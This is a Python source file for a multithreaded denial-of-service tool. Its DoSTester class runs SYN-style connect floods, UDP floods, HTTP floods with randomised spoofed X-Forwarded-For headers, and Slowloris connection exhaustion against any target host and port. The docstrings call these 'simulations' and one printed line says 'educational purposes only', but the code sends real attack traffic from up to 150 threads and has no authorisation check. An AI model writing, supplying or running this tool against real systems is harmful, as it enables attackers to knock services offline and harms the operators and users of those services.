#!/usr/bin/env python3
import socket
import threading
import time
import random
from colorama import Fore, Style
from concurrent.futures import ThreadPoolExecutor

class DoSTester:
    def __init__(self, target):
        self.target = target
        self.running = False
        self.packets_sent = 0
        self.lock = threading.Lock()
        self.start_time = None
        
    def _increment_packets(self):
        """Thread-safe packet counter increment"""
        with self.lock:
            self.packets_sent += 1

    def _generate_random_packet(self, size=1024):
        """Generate random packet data"""
        return random.randbytes(size)

    def _generate_http_flood_packet(self):
        """Generate HTTP flood packet"""
        methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS']
        method = random.choice(methods)
        paths = ['/', '/index.html', '/api', '/login', '/admin', '/user']
        path = random.choice(paths)
        
        headers = [
            f"{method} {path} HTTP/1.1",
            f"Host: {self.target}",
            "Connection: keep-alive",
            f"User-Agent: Mozilla/{random.uniform(1.0, 9.9):.1f}",
            f"Accept: */*",
            f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}."
            f"{random.randint(1,255)}.{random.randint(1,255)}"
        ]
        return "\r\n".join(headers).encode() + b"\r\n\r\n"

    def _syn_flood(self, port, duration):
        """SYN flood attack simulation"""
        try:
            while time.time() - self.start_time < duration and self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.setblocking(0)  # Non-blocking
                    sock.connect_ex((self.target, port))
                    self._increment_packets()
                except:
                    pass
                finally:
                    sock.close()
        except Exception as e:
            print(f"{Fore.RED}[!] Error in SYN flood: {str(e)}{Style.RESET_ALL}")

    def _udp_flood(self, port, duration):
        """UDP flood attack simulation"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while time.time() - self.start_time < duration and self.running:
                try:
                    data = self._generate_random_packet()
                    sock.sendto(data, (self.target, port))
                    self._increment_packets()
                except:
                    pass
        except Exception as e:
            print(f"{Fore.RED}[!] Error in UDP flood: {str(e)}{Style.RESET_ALL}")
        finally:
            sock.close()

    def _http_flood(self, port, duration):
        """HTTP flood attack simulation"""
        try:
            while time.time() - self.start_time < duration and self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2)
                    sock.connect((self.target, port))
                    packet = self._generate_http_flood_packet()
                    sock.send(packet)
                    self._increment_packets()
                    sock.close()
                except:
                    pass
        except Exception as e:
            print(f"{Fore.RED}[!] Error in HTTP flood: {str(e)}{Style.RESET_ALL}")

    def _slowloris(self, port, duration):
        """Slowloris attack simulation"""
        sockets_list = []
        try:
            while time.time() - self.start_time < duration and self.running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(4)
                    sock.connect((self.target, port))
                    
                    # Send partial HTTP request
                    sock.send(b"GET / HTTP/1.1\r\n")
                    sock.send(f"Host: {self.target}\r\n".encode())
                    sock.send(b"User-Agent: Mozilla/5.0\r\n")
                    
                    sockets_list.append(sock)
                    self._increment_packets()
                    
                    # Keep connections alive
                    for s in sockets_list:
                        try:
                            s.send(b"X-a: b\r\n")
                        except:
                            sockets_list.remove(s)
                            
                    time.sleep(1)
                except:
                    continue
                    
        except Exception as e:
            print(f"{Fore.RED}[!] Error in Slowloris attack: {str(e)}{Style.RESET_ALL}")
        finally:
            for s in sockets_list:
                try:
                    s.close()
                except:
                    pass

    def start_test(self, duration=10, port=80, method="syn"):
        """Start DoS testing"""
        print(f"\n{Fore.YELLOW}[!] WARNING: This is for educational purposes only!{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Starting DoS test on {self.target}:{port} using {method.upper()} method{Style.RESET_ALL}")
        
        self.running = True
        self.start_time = time.time()
        self.packets_sent = 0
        
        # Number of threads for each attack type
        thread_counts = {
            "syn": 50,
            "udp": 25,
            "http": 100,
            "slowloris": 150
        }
        
        threads = []
        attack_function = {
            "syn": self._syn_flood,
            "udp": self._udp_flood,
            "http": self._http_flood,
            "slowloris": self._slowloris
        }.get(method.lower())
        
        if not attack_function:
            print(f"{Fore.RED}[!] Invalid attack method specified{Style.RESET_ALL}")
            return
            
        thread_count = thread_counts.get(method.lower(), 50)
        
        try:
            # Start attack threads
            with ThreadPoolExecutor(max_workers=thread_count) as executor:
                futures = [
                    executor.submit(attack_function, port, duration)
                    for _ in range(thread_count)
                ]
                
            # Monitor and display progress
            while time.time() - self.start_time < duration:
                elapsed = time.time() - self.start_time
                rate = self.packets_sent / elapsed if elapsed > 0 else 0
                print(f"\r{Fore.CYAN}[*] Packets sent: {self.packets_sent} | "
                      f"Rate: {rate:.2f} packets/sec | "
                      f"Time remaining: {duration - elapsed:.1f}s{Style.RESET_ALL}", 
                      end='', flush=True)
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}[!] Test interrupted by user{Style.RESET_ALL}")
        finally:
            self.running = False
            elapsed = time.time() - self.start_time
            rate = self.packets_sent / elapsed if elapsed > 0 else 0
            
            print(f"\n{Fore.GREEN}[+] DoS test completed{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Total packets sent: {self.packets_sent}{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Average rate: {rate:.2f} packets/sec{Style.RESET_ALL}")
            print(f"{Fore.GREEN}[+] Duration: {elapsed:.2f} seconds{Style.RESET_ALL}")

    def generate_report(self):
        """Generate a report of the DoS test"""
        if self.start_time is None:
            return "No test has been run yet."
            
        elapsed = time.time() - self.start_time
        rate = self.packets_sent / elapsed if elapsed > 0 else 0
        
        report = {
            'target': self.target,
            'duration': elapsed,
            'packets_sent': self.packets_sent,
            'average_rate': rate,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        
        return report
